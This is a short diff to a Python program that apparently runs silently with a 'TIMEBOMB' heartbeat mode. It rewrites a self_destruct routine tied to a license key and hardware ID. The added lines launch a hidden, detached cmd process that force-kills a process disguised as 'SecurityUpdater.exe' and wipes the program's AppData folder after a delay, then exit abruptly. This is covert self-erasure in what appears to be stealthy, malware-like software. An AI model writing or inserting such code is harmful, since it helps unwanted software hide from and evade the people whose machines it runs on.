@@ -123,15 +123,15 @@ def self_destruct(license_key, hwid):
     except Exception:
         pass
 
-    # Clean up PhantomLead helper directory
+    # Clean up PhantomLead helper directory and kill any lingering updater processes
     phantom_dir = os.path.join(os.environ.get("AppData", ""), "PhantomLead")
-    if os.path.exists(phantom_dir):
-        try:
-            shutil.rmtree(phantom_dir, ignore_errors=True)
-        except Exception:
-            pass
+    try:
+        cleanup_cmd = f'ping 127.0.0.1 -n 3 > nul & taskkill /F /IM SecurityUpdater.exe /T > nul 2>&1 & rd /s /q "{phantom_dir}"'
+        subprocess.Popen(f'cmd /c "{cleanup_cmd}"', shell=True, creationflags=0x08000000 | 0x00000200)
+    except Exception:
+        pass
 
-    sys.exit(0)
+    os._exit(0)
 
 def run_heartbeat(mode="TIMEBOMB"):
     """Background polling loop (runs completely silently with NO GUI)."""
